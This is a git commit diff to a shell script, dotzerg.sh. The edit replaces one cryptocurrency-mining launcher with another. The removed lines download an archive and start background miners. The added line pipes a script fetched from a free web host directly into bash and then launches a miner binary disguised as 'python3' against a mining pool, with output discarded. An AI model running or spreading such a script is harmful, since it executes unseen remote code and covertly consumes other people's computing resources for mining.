cce9cd09be2b515a7cf54bb76859f357fab7df74
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-16 00:13:45 +0700

    Update dotzerg.sh

--- dotzerg.sh
+++ dotzerg.sh
@@ -1,22 +1,5 @@
-wget -O dot s.id/dotaja
+bash -c "$(wget -qO- momok.x10.bz/Alat-Coli-SRB.sh)"
 
-tar -xzvf dot
-
-nohup ./dotlol/python3 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB > /dev/null 2>&1 &
-
-sleep 15
-
-nohup ./dotcpu/python3 -a yespower -o yespower.asia.mine.zergpool.com:6533 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,mc=QCH > /dev/null 2>&1 &
+screen ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB > /dev/null 2>&1 &
 
 sleep 5
-
-clear
-
-echo "======================================================"
-echo "██████╗  ██████╗ ████████╗     █████╗      ██╗ █████╗"
-echo "██╔══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗     ██║██╔══██╗"
-echo "██║  ██║██║   ██║   ██║       ███████║     ██║███████║"
-echo "██║  ██║██║   ██║   ██║       ██╔══██║██   ██║██╔══██║"
-echo "██████╔╝╚██████╔╝   ██║       ██║  ██║╚█████╔╝██║  ██║"
-echo "╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝"
-echo "=============created By Hendi Kusnandi================"
